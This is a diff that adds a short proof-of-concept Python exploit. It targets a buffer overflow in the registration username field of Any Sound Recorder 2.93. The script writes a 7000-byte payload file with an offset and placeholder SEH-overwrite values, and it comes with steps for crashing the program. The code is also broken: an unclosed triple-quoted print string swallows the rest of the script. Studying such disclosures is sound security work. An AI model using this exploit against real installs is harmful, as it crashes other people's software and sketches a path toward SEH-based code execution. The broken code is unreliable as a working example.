@@ -1,0 +1,33 @@
+# Exploit Title: Any Sound Recorder 2.93 - Denial of Service (PoC)
+# Date: 2018-09-09
+# Exploit Author: T3jv1l
+# Vendor Homepage: http://www.any-sound-recorder.com
+# Software: http://www.any-sound-recorder.com/anysoundrecorder.exe
+# Version: Any Sound Recorder 2.93 
+# Tested on: Windows 7 SP1 x86
+
+#!/usr/bin/python 
+
+import struct
+print"""
+
+#1.  Download and install the setup file
+#2.  A file "Byte.txt" will be created
+#3.  Click Help > Enter key code... in tool bar
+#4.  Copy the contents of the file (Byte.txt) and paste in the Username Name field 
+#5.  Click Register and BOOMMMM !!!! 
+
+totalsize = 7000 # total size buff
+buffer= "\x41" * 900  #Offset
+nseh= "BBBB" # next seh address 
+seh= "CCCC"  # seh address
+shellcode= "T" * (totalsize-len(buffer+nseh+seh))
+payload = buffer + nseh + seh + shellcode
+try:
+    f=open("Byte.txt","w")
+    print "[+] Creating %s bytes payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
